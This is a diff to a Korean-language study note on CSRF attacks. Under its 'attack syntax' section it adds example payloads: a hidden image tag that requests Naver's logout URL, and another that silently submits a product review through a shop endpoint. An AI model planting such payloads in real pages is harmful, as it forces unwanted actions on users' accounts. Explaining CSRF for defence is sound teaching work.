@@ -24,10 +24,16 @@ CSRF의 공격이 수행되기 위해서는 몇가지의 조건이 필요하다.
 <br>
 
 ## 공격구문
-접속 시 로그아웃 시키기
 
-```bash
-<img src="https://naver.com/logout" width="0", height="0">
+
+```js
+접속 시 로그아웃 시키기
+<img src="https://www.naver.com/logout" width="1", height="1">
+```
+
+```js
+클릭 시 의도치 않은 후기작성이 됨
+<img src = "/main/product_memo.asp?uid=178&memo=attack&point=1" width = "1" height = "1"/>
 ```
 
 ## 대응방안
